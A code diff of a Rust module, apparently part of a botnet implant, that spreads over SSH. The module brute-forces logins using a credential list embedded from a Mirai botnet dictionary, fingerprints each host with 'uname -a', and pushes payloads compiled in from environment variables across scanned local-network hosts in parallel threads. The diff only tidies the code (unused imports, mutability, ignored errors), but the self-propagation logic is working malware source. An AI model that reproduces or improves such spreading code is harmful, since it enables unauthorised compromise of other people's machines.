@@ -1,12 +1,11 @@
 use std::io::Read;
 use std::net::TcpStream;
 use std::sync::Mutex;
-use anyhow::anyhow;
 use ssh2::Session;
 use crate::tasks::{NetworkHost, Port, RunningTasks, scan_local_net};
 use rayon::prelude::*;
 use crate::models::TaskResult;
-use crate::tasks::network_scan::{network_scan, parse_ports};
+use crate::tasks::network_scan::parse_ports;
 
 pub const SSH_PORT: u16 = 22;
 const SSH_CONNECT_TIMEOUT: u32 = 5000;
@@ -14,7 +13,7 @@ const SPREAD_THREADS: usize = 6;
 static OS_ID_COMMAND: &'static str = "uname -a";
 static DICTIONARY: &'static str = include_str!("../../src/ext/mirai-botnet.txt");
 
-static LINUX: &'static str = "linux";
+//static LINUX: &'static str = "linux";
 static LINUX_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");
 static MACOS: &'static str = "darwin";
 static MACOS_PAYLOAD: &'static str = env!("SSH_PAYLOAD_LINUX");
@@ -58,7 +57,7 @@ fn run_command(sess: &Session, command: String) -> Result<String, anyhow::Error>
     // Collect output
     let mut s = String::new();
     channel.read_to_string(&mut s)?;
-    channel.wait_close();
+    let _ = channel.wait_close();
 
     Ok(s)
 }
@@ -97,7 +96,7 @@ fn try_ssh_spread(host: &String, username: &String, password: &String) -> Option
     // Initialise connection
     let sess = match ssh_connect(host, username, password) {
         Ok(val) => val,
-        Err(e) => {
+        Err(_) => {
             return None;
         }
     };
@@ -160,7 +159,7 @@ fn run_ssh_spread(hosts: Vec<NetworkHost>) -> Result<Vec<String>, anyhow::Error>
     let pool = rayon::ThreadPoolBuilder::new()
         .num_threads(SPREAD_THREADS)
         .build()?;
-    let mut res: Mutex<Vec<String>> = Mutex::new(Vec::new());
+    let res: Mutex<Vec<String>> = Mutex::new(Vec::new());
 
     pool.install(|| {
         DICTIONARY
@@ -206,7 +205,7 @@ fn parse_target_hosts(data: String) -> Vec<NetworkHost> {
         if h.contains(':') {
             // Ports are defined, also needs to parse ports
             let h_split = h.split(':').collect::<Vec<&str>>();
-            let mut ports = parse_ports(h_split[1].to_string())
+            let ports = parse_ports(h_split[1].to_string())
                 .into_iter()
                 .map(|p| {
                     Port {
@@ -238,7 +237,7 @@ fn parse_target_hosts(data: String) -> Vec<NetworkHost> {
 /// Intended to be run on another thread than the main thread, puts the resulting data in
 /// RUNNING_TASKS
 pub fn ssh_spread(running_tasks: &Mutex<RunningTasks>, task_id: String, host_string: String) {
-    let mut hosts = Vec::new();
+    let hosts;
     if !host_string.is_empty() {
         // Uses hosts defined in
         hosts = parse_target_hosts(host_string);
